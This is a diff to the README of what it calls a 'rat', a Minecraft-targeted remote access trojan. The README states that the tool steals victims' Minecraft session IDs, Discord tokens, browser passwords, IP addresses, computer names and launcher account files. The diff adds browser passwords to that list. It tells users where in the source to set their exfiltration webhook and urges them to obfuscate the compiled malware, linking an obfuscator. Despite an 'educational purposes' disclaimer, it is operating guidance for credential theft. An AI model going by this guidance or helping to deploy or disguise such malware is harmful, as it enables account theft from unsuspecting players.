@@ -6,10 +6,9 @@
 ## To use this obfuscator. Download it, open command prompt. Type "java -jar [drag skidfus into cmd] obfuscate [drag in rat]" then press enter.
 ## OBFUSCATION TUTORIAL: https://youtu.be/QziVWrTdpbQ
 ## This is purely for educational purposes
-#### The rat steals Minecraft session id, Discord token, IP and certain files on the victims computer including essentials, feather and lunar accounts
+#### The rat steals Minecraft session id, Discord token, Browser passwords, IP, computer name and certain files on the victims computer including essentials, feather and lunar accounts
 #### Embed example: 
-![beamed](https://media.discordapp.net/attachments/950469499818242091/1067490558093828186/beamedl.png)
-![files](https://cdn.discordapp.com/attachments/950469499818242091/1067490558341283860/beamedL2.png)
+![beamed](https://cdn.discordapp.com/attachments/1096171893171703899/1101888385079050290/image.png)
 
 ### you can change the webhook in the file directory: 
 ## src/main/java/json/jsonrareexception
@@ -20,7 +19,6 @@
 ![cum](https://i.imgur.com/vnM8hYK.png)
 ![cum2](https://cdn.discordapp.com/attachments/961651654971764736/1067488214396448798/image.png)
 
-### The rat is the file without "-sources" at the end.
 ### After compiling it I highly recommend obfuscating it
 ### It might not work without obfuscation. 
 ### heres a good obfuscator: https://github.com/skidfuscatordev/skidfuscator-java-obfuscator/
